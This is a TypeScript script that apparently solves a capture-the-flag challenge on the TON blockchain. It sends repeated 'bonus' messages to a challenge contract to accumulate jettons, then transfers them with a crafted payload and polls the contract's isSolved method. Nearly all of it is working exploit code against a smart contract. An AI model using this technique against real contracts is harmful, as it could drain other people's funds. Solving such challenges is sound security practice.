import { TonClient, WalletContractV3R2 } from '@ton/ton';
import { keyPairFromSeed } from '@ton/crypto';
import { Address, toNano, beginCell, SendMode, TupleItem, internal } from '@ton/core';
import * as fs from 'fs';

const SESSION_FILE = 'session.json';
interface SessionData { uuid: string; challenge: string; api: string; wallet_id: number; seed: string; }

function sleep(ms: number) { return new Promise(r => setTimeout(r, ms)); }

async function getBal(client: TonClient, addr: Address) { return client.getBalance(addr); }
async function getJettonBal(client: TonClient, addr: Address): Promise<bigint | null> {
    try { const r = await client.runMethod(addr, 'get_wallet_data'); return r.stack.readBigNumber(); } catch { return null; }
}
async function getSupply(client: TonClient, minter: Address): Promise<bigint | null> {
    try { const r = await client.runMethod(minter, 'get_jetton_data'); return r.stack.readBigNumber(); } catch { return null; }
}

async function sendXfer(openedWallet: any, wallet: any, provider: any, kp: any, msg: any) {
    const seqno = await wallet.getSeqno(provider);
    await openedWallet.sendTransfer({ seqno, secretKey: kp.secretKey, messages: [msg], sendMode: SendMode.PAY_GAS_SEPARATELY });
    for (let w = 0; w < 30; w++) { await sleep(2000); const ns = await wallet.getSeqno(provider); if (ns > seqno) return; }
    throw new Error(`seqno stuck`);
}

async function main() {
    const s: SessionData = JSON.parse(fs.readFileSync(SESSION_FILE, 'utf-8'));
    console.log(`UUID: ${s.uuid}\nChallenge: ${s.challenge}\n`);
    const client = new TonClient({ endpoint: s.api.replace(/\/+$/, '') + '/jsonRPC', timeout: 30000 });
    const challengeAddr = Address.parse(s.challenge);
    const kp = keyPairFromSeed(Buffer.from(s.seed, 'hex'));
    const wallet = WalletContractV3R2.create({ workchain: -1, publicKey: kp.publicKey, walletId: s.wallet_id });
    const openedWallet = client.open(wallet);
    const provider = client.provider(wallet.address, wallet.init);
    console.log(`Wallet: ${wallet.address}\n`);

    const mr = await client.runMethod(challengeAddr, 'minter');
    const minter = mr.stack.readAddress();
    const pwc = beginCell().storeAddress(wallet.address).endCell();
    const pwr = await client.runMethod(minter, 'get_wallet_address', [{ type: 'slice', cell: pwc } as TupleItem]);
    const pJetton = pwr.stack.readAddress();
    const cwc = beginCell().storeAddress(challengeAddr).endCell();
    const cwr = await client.runMethod(minter, 'get_wallet_address', [{ type: 'slice', cell: cwc } as TupleItem]);
    const cJetton = cwr.stack.readAddress();
    console.log(`Minter: ${minter}`);
    console.log(`pJetton: ${pJetton}`);
    console.log(`cJetton: ${cJetton}\n`);

    // === DIAGNOSE: Try Bonus with higher value ===
    const bonusBody = beginCell().storeUint(0x13370002, 32).storeUint(0, 64).endCell();

    for (let i = 0; i < 2; i++) {
        const beforeTon = await getBal(client, wallet.address);
        const beforeSupply = await getSupply(client, minter);
        const beforeJet = await getJettonBal(client, pJetton);
        const beforeChall = await getBal(client, challengeAddr);

        // Try sending more TON with later bonuses
        const sendVal = i === 0 ? '0.4' : '0.5';
        const seqno = await wallet.getSeqno(provider);
        console.log(`Bonus #${i+1}: sending ${sendVal} TON, seqno=${seqno}, TON=${Number(beforeTon)/1e9}`);
        await openedWallet.sendTransfer({ seqno, secretKey: kp.secretKey,
            messages: [internal({ to: challengeAddr, value: toNano(sendVal), body: bonusBody, bounce: false })],
            sendMode: SendMode.PAY_GAS_SEPARATELY });

        for (let w = 0; w < 30; w++) { await sleep(2000); const ns = await wallet.getSeqno(provider); if (ns > seqno) break; }
        await sleep(12000);

        const afterSupply = await getSupply(client, minter);
        const afterJet = await getJettonBal(client, pJetton);
        const afterChall = await getBal(client, challengeAddr);
        const afterTon = await getBal(client, wallet.address);

        console.log(`  Supply: ${beforeSupply} → ${afterSupply} (${afterSupply !== null && beforeSupply !== null ? Number(afterSupply - beforeSupply) : '?'})`);
        console.log(`  Jetton: ${beforeJet} → ${afterJet}`);
        console.log(`  Chall: ${Number(beforeChall)/1e9} → ${Number(afterChall)/1e9} (${Number(afterChall - beforeChall)/1e9})`);
        console.log(`  TON spent: ${Number(beforeTon - afterTon)/1e9}`);
    }

    // === If we have 100+ jettons, try Solve ===
    let jetBal = await getJettonBal(client, pJetton);
    let challBal = await getBal(client, challengeAddr);
    console.log(`\nFinal: Jetton=${jetBal} Supply=${await getSupply(client, minter)} Chall=${Number(challBal)/1e9} TON=${Number(await getBal(client, wallet.address))/1e9}`);

    if (jetBal !== null && jetBal >= 100n) {
        console.log(`\n=== Transfer ${jetBal} jettons + Solve ===`);
        const xferBody = beginCell()
            .storeUint(0x0f8a7ea5, 32).storeUint(0, 64)
            .storeCoins(jetBal).storeAddress(cJetton).storeAddress(null)
            .storeBit(0).storeCoins(toNano('0.05'))
            .storeUint(0x13370005, 32).storeUint(0, 64)
        .endCell();
        await sendXfer(openedWallet, wallet, provider, kp, internal({ to: pJetton, value: toNano('0.2'), body: xferBody, bounce: false }));
        await sleep(20000);
        console.log(`After xfer: Jetton=${await getJettonBal(client, pJetton)}`);

        for (let i = 0; i < 16; i++) {
            try { const r = await client.runMethod(challengeAddr, 'isSolved'); if (r.stack.readBoolean()) { console.log(`\n🎉 SOLVED! 🎉\nUUID: ${s.uuid}`); process.exit(0); } } catch {}
            await sleep(5000);
        }
    } else {
        console.log(`\nOnly ${jetBal} jettons. Need >= 100.`);
        // Check if cJetton has some (from prior transfers)
        const cj = await getJettonBal(client, cJetton);
        console.log(`cJetton bal: ${cj}`);
    }
}
main().catch(console.error);
